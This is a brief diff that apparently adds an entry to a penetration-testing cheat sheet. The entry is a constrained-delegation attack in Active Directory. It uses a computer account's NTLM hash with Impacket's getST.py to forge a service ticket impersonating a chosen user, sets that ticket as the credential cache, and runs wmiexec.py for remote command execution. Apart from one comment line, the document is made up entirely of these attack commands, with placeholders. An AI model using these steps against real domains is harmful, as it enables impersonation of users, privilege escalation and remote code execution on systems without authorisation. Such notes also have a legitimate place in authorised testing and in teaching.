@@ -1,0 +1,7 @@
+# create service ticket using computer account and delegate ticket to impersonate user
+getST.py -spn cifs/<fqdnRhost> -impersonate <impersonateUser> -hashes <lm:ntHash> <domain>/<computerAccount\$>
+
+export KRB5CCNAME=<impersonateUser>.ccache
+
+wmiexec.py -k -no-pass <fqdn>
+
